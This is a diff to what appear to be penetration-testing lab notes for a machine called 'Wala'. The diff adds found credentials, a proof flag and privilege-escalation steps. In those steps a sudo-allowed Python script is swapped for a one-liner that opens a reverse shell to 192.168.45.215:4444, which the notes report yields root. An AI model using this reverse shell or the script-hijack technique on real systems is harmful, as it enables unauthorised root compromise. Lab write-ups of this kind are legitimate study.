@@ -1,7 +1,7 @@
 **Metadata**
 
 - IP Address:  192.168.219.97
-- Hostname: 
+- Hostname:  Wala
 - OS: 	
 - Found Credentials/Users:
 		admin/secret
@@ -9,7 +9,7 @@
 Main Objectives:
 
 Local.txt = 
-Proof.txt = 
+Proof.txt = 35e824fc01375d9a5bb45633cae78731
 
 **Enumeration**
 
@@ -961,9 +961,33 @@ Sudo version 1.8.27
 
 1. PE Steps
 
-```
+- Noticed that the following command is allowed with no password using sudo. 
 
 ```
+    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
+```
+
+- Tested if could rename the wifi_reset.py 
+
+```
+mv wifi_reset.py wifi_reset2.py
+```
+
+- Created new wifi.reset.py
+
+```
+nano wifi_reset.py
+
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.215",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
+```
+
+- Ran wifi_reset.py using sudo.
+
+![[Pasted image 20260313161320.png]]
+
+- Received reverse shell as root. 
+
+![[Pasted image 20260313161350.png]]
 
 2. Notes
 
